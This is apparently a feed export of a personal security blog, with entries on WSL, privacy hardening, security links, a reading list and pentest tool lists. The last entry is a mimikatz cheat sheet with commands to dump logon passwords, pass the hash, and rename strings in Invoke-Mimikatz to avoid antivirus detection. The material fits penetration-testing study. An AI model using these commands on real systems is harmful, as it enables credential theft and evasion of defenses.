item.title: wsl
item.author: blackvolga@pm.me (GAZ23)
item.description:
Sometimes we all get stuck on a windows machine.

Luckily, since the March 2018 Update, Windows Subsystem for Linux has grown into a surprisingly superior alternative to the likes of cygwin for your basic terminal needs.

item.author: blackvolga@pm.me (GAZ23)
item.description: Network Start with a router that supports firmware like DD-WRT or OpenWRT Setup a firewall like ipFire or pfSense OR purchase a dedicated device like the SG-1000 Blacklist ad/tracking domains with Pi-Hole BIOS Use CoreBoot if your hardware allows OS Antergos OR TAILS Start with the basics: https://ssd.eff.org/en Advanced Mode: Qubes or Whonix Arch First Steps https://github.com/Jguer/yay https://github.com/sorin-ionescu/prezto https://wiki.archlinux.org/index.php/security For everything else, see the oracle: wiki.archlinux.org SSH EdDSA requires OpenSSH 6.

item.title: Cheats

item.title: Links
item.author: blackvolga@pm.me (GAZ23)
item.description: Basics Notepad https://privatebin.net/ Shared Notepad http://etherpad.org/ Identity https://keybase.io/ Email https://protonmail.com/ Chat https://crypto.cat/ Mobile https://signal.org/ AND https://briarproject.org/ Disk\File Encryption https://www.veracrypt.fr/en/Home.html https://letsencrypt.org/ https://haveibeenpwned.com/ http://www.shodan.io/ WebGun - WebGun, XSS Payload Creator Hackvertor - Tool to convert various encodings and generate attack vectors Fuzzdb - Dictionary of attack patterns and primitives for black-box application testing Polyglot Challenge with submitted solutions

item.title: Reading List
item.author: blackvolga@pm.me (GAZ23)
item.description: CTF Field Guide CTF Resources Metasploit Unleashed Digital Privacy at borders Videos * Internet Security Weakness and Targets Lectures 2017/18 * Curated list of Security Talks and Videos * How Tor Users Got Caught Courses Cybary Certified Information Systems Security Professional Advanced Penetration Testing Course follows book “Penetration Testing: A Hands-On Introduction to Hacking” that Georgia Weidman wrote MIT Advanced Topics in Cryptography 2003

item.title: Tools
item.author: blackvolga@pm.me (GAZ23)
item.description: Recon https://github.com/jordanpotti/AWSBucketDump https://github.com/laramies/theHarvester https://github.com/thewhiteh4t/pwnedOrNot DNS https://github.com/darkoperator/dnsrecon https://github.com/michenriksen/aquatone CTF https://github.com/zardus/ctf-tools https://github.com/apsdehal/awesome-ctf Exploits Linux linux-exploit-suggester.sh - Linux privilege escalation auditing tool written in bash Linux_Exploit_Suggester.pl v2 - Next-generation exploit suggester based on Linux_Exploit_Suggester Linux Soft Exploit Suggester - linux-soft-exploit-suggester finds exploits for all vulnerable software in a system helping with the privilege escalation. It focuses on software packages instead of Kernel vulnerabilities

item.title: powershell
item.author: blackvolga@pm.me (GAZ23)
item.description: https://github.com/gentilkiwi/mimikatz https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz TLDR: 1.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit extract passwds 1mimikatz_command -f sekurlsa::logonPasswords full 2mimikatz_command -f sekurlsa::wdigest pass the hash (on the left hand side) 1sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe mimidawgz (avoid AV detection) 1mv Invoke-Mimikatz.ps1 Invoke-MimiDawgz.ps1 2 3sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidawgz/g' Invoke-MimiDawgz.ps1 4sed -i -e '/<#/,/#>/c\\' Invoke-MimiDawgz.ps1 5 6sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-MimiDawgz.ps1 7 8sed -i -e 's/DumpCreds/DumpCred/g' Invoke-MimiDawgz.ps1 9 10sed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-MimiDawgz.ps1 11 12sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' 13Invoke-MimiDawgz.
